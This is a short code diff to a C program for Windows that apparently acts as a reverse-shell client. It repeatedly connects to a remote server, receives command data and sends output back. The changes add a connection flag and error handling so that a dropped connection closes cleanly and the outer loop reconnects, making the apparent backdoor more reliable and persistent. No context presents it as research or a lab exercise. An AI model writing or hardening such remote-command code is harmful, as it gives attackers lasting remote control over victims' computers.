@@ -43,12 +43,12 @@ int main() {
   while (1) {
 
     SOCKET sock = connect_to_server();
+    int connection_alive = 1;
 
     char recv_buffer[1024];
     int recv_len = 0;
     char cmd[1024];
-    while (1) {
-
+    while (connection_alive) {
 
       int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);
 
@@ -84,7 +84,13 @@ int main() {
             while (sent < n_bytes) {
               int n = send(sock, output + sent, n_bytes - sent, 0);
 
-              sent += n;
+              if (n > 0) {
+                sent += n;
+              } else {
+                closesocket(sock);
+                connection_alive = 0;
+                break;
+              }
             }
 
           }
@@ -94,6 +100,7 @@ int main() {
 
       } else {
           closesocket(sock);
+          connection_alive = 0;
           break;
       }
     }
